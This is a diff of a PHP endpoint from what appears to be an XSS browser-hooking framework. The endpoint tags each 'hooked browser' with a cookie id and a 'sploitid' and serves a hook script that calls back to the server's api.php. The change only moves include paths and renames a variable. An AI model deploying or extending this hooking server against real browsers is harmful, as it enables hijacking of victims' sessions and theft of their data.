@@ -1,5 +1,5 @@
 <?php
-require("../config.php");
+require("../lib/config.php");
 
 // figure out the id for the hooked browser.   if we don't have one, create one
 if (isset($_COOKIE['xssid'])) {
@@ -17,13 +17,13 @@ else {
 }
 
 // the header has parameters custom to this server (server callbacks, etc)
-$header = "xss.server = '{$_SERVER['HTTP_HOST']}';\n";
-$header .= "xss.api = 'http://{$_SERVER['HTTP_HOST']}/api.php';\n";
+$trailer = "xss.server = '{$_SERVER['HTTP_HOST']}';\n";
+$trailer .= "xss.api = 'http://{$_SERVER['HTTP_HOST']}/api.php';\n";
 
 // since the sploitid is custom to each hooked browser, we can't cache that
 // this will be dumped onto each new h.php call
 echo "var sploitid = '$id';\n";
-require '../jsmin.php';
-serve_javascript("h.js", $header);
+require '../lib/jsmin.php';
+serve_javascript("h.js", $trailer);
 
 ?>
